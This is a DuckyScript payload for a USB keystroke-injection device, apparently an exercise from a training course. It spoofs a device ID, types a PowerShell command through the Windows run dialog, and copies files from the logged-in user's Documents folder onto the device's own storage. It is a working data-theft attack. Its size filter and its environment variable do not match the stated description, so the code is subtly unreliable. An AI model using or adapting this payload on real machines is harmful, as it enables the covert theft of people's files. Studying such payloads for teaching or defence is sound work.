REM TITLE Exercise 13-2
REM AUTHOR Crash
REM_BLOCK DESCRIPTION Win: Exfil all files smaller than 10kb from the logged in
    user's 'Documents' directory
END_REM
ATTACKMODE HID STORAGE VID_05AC PID_021E MAN_FUCK PROD_ICE SERIAL_111111
DELAY 3000

INJECT_MOD
GUI r
STRING powershell "$m=(Get-Volume FileSystemLabel 'DUCKY').DriveLetter;
STRING Get-ChildItem -Path $env:User_Profile\Documents -Recurse | 
STRING ForEach-Object{if ($_.Length / 10KB -lt 10){cp $_.FullName $m':\'$_ }"
ENTER
